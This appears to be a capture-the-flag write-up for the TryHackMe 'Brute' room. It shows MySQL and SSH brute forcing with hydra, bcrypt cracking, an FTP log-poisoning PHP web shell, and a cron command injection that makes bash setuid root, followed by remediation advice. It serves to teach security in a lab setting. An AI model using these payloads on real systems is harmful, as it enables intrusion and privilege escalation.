# Brute

| Field | Value |
| --- | --- |
| Platform | TryHackMe |
| Room | [Brute](https://tryhackme.com/room/brute) ("You as well, Brutus?") |
| Difficulty | Medium |
| OS | Ubuntu Linux |
| Tags | MySQL brute force, bcrypt, FTP log poisoning, cron, command injection |
| Date | 2026-09-01 |

> You as well, Brutus?

The title is the hint. Enumeration looks like a generic brute-force box (FTP, SSH, HTTP, MySQL), but the user password is a mutated Julius Caesar quote and root comes from unsanitized `echo` in a root cron job.

## Contents

- [Reconnaissance](#reconnaissance)
- [MySQL brute force](#mysql-brute-force)
- [Web login](#web-login)
- [FTP log poisoning (optional foothold)](#ftp-log-poisoning-optional-foothold)
- [SSH as adrian](#ssh-as-adrian)
- [User flag](#user-flag)
- [Privilege escalation](#privilege-escalation)
- [Root flag](#root-flag)
- [Remediation](#remediation)

## Reconnaissance

```bash
nmap -Pn -sV -sC -p 21,22,80,3306 TARGET
```

```text
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
3306/tcp open  mysql   MySQL 8.0.28-0ubuntu0.20.04.3
```

Port 80 is a PHP login (`index.php`) that sets `PHPSESSID`. Anonymous FTP is disabled.

## MySQL brute force

MySQL accepts remote password authentication. `root` is in rockyou:

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://TARGET:3306
```

```text
[3306][mysql] host: TARGET  login: root  password: rockyou
```

```bash
mysql -h TARGET -u root -prockyou
```

```sql
SHOW DATABASES;
USE website;
SELECT username, password FROM users;
```

```text
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| Adrian   | $2y$10$tLzQuuQ.h6zBuX8dV83zmu9pFlGt3EF9gQO4aJ8KdnSYxz0SKn4we |
+----------+--------------------------------------------------------------+
```

The hash is bcrypt (`$2y$`, hashcat mode 3200). It cracks immediately against rockyou:

```bash
echo '$2y$10$tLzQuuQ.h6zBuX8dV83zmu9pFlGt3EF9gQO4aJ8KdnSYxz0SKn4we' > hash.txt
hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
# or: john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

```text
Adrian:tigger
```

Those credentials are for the web app, not SSH.

## Web login

```http
POST /index.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=Adrian&password=tigger
```

`welcome.php` greets Adrian and exposes a "Log" button that reads the vsftpd log. That page is also the LFI/log-poisoning sink used for a `www-data` shell if you want one before SSH.

`/var/www/html/config.php` (readable as `www-data`) contains a second MySQL account:

```php
define('DB_USERNAME', 'adrian');
define('DB_PASSWORD', 'P@sswr0d789!');
define('DB_NAME', 'website');
```

## FTP log poisoning (optional foothold)

vsftpd records the attempted username. A failed login with a PHP payload plants code in `/var/log/vsftpd.log`. Clicking Log on `welcome.php` includes that file, so the payload executes as `www-data`.

```bash
ftp TARGET
# Name: <?php system($_GET['x']); ?>
# Password: anything
```

Then:

```text
http://TARGET/welcome.php?x=id
```

A reverse shell is possible from here, but it is not required. `user.txt` is `640` (`adrian:adrian`) and cannot be read as `www-data`. The useful file at this stage is `/home/adrian/.reminder`.

## SSH as adrian

`.reminder` is world-readable:

```text
Rules:
best of 64
+ exclamation

ettubrute
```

"Et tu, Brute?" with hashcat/john `best64` rules, then append `!`:

```bash
echo ettubrute > pass.txt
hashcat --stdout pass.txt -r /usr/share/hashcat/rules/best64.rule | sed 's/$/!/' > wordlist.txt
hydra -l adrian -P wordlist.txt ssh://TARGET
```

```text
[22][ssh] host: TARGET  login: adrian  password: theettubrute!
```

```bash
ssh adrian@TARGET
# password: theettubrute!
```

## User flag

```bash
cat /home/adrian/user.txt
```

```text
THM{PoI$0n_tH@t_L0g}
```

## Privilege escalation

Home directory:

```text
ftp/
punch_in
punch_in.sh
user.txt
```

`punch_in.sh` (root-owned, adrian-readable) appends a timestamp every minute:

```bash
#!/bin/bash
/usr/bin/echo 'Punched in at '$(/usr/bin/date +"%H:%M") >> /home/adrian/punch_in
```

`ftp/files/script` is the admin checker. Root cron runs the same logic against Adrian's punch card:

```sh
#!/bin/sh
while read line; do
  /usr/bin/sh -c "echo $line"
done < /home/adrian/punch_in
```

`$line` is unquoted. Anything Adrian writes into `punch_in` is executed by `/usr/bin/sh -c` as root once a minute.

```bash
printf '%s\n' '$(chmod u+s /usr/bin/bash)' >> /home/adrian/punch_in
```

Wait for the next minute, then:

```bash
ls -l /usr/bin/bash
/usr/bin/bash -p -c 'id; cat /root/root.txt'
```

After the cron fires, bash is setuid root:

```text
-rwsr-xr-x 1 root root ... /usr/bin/bash
uid=1000(adrian) gid=1000(adrian) euid=0(root)
```

A reverse shell also works if the payload is a command substitution, for example:

```bash
printf '%s\n' '`python3 -c "import os,pty; os.setuid(0); pty.spawn(\"/bin/bash\")"`' >> /home/adrian/punch_in
```

## Root flag

```text
THM{C0mm@nD_Inj3cT1on_4_D@_BruT3}
```

## Remediation

- Do not expose MySQL to the network with a rockyou password.
- Do not include vsftpd logs in a PHP page. If logs must be viewed, treat them as text and escape output.
- Quote cron arguments: `/usr/bin/sh -c 'echo "$line"'` (still prefer not to `eval` user files at all).
- Keep punch-card data out of a shell. Read the file in a language that does not expand `$()` / backticks.
- Restrict write access to files consumed by root jobs.
